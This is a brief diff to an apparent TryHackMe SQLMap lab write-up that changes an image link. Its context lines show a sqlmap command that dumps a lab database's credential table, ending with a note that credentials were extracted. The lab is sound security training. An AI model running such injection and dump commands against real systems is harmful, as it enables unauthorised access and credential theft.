@@ -138,7 +138,7 @@ One table: `user`. That's where the credentials are stored.
 sqlmap -u 'http://10.112.153.155/ai/includes/user_login?email=test&password=test' --level=5 -D ai -T user --dump --batch
 ```
 
-![Data Dumped](sqlmap_task_3.png)
+![Data Dumped](https://github.com/alimirza2412/Tryhackme-notes/blob/b1b4e32ab8522976f51ce01cb8f5cceaee62ec0e/Cyber-Security-101/Offensive-Security-Tooling/SQLMap%3AThe-Basics/sqlmap%20task%204.png)
 
 **Result — credentials extracted! 🎉**
 
